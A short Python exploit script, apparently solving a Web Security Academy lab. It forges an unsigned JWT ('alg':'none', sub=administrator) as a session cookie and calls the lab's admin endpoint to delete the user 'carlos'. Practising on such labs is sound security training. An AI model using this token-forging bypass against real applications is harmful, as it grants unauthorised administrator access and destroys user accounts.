import requests
from bs4 import BeautifulSoup

# requirements.txt
# pip3 install bs4
# pip3 install lxml

def exploit(url,url_delete):
    # {"typ":"JWT","alg":"none"}.{"sub":"administrator"}.
    cookie = {"Cookie":"session=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0."}
    try:
        r = requests.get(url+url_delete, headers=cookie)
        print(r.status_code)
    except Exception as e:
        print(f"[ERRRO] {e}")

if __name__ == '__main__':
    url = "https://0ae000470379f84f81053ea100b30069.web-security-academy.net"
    url_delete = "/admin/delete?username=carlos"
    exploit(url,url_delete)

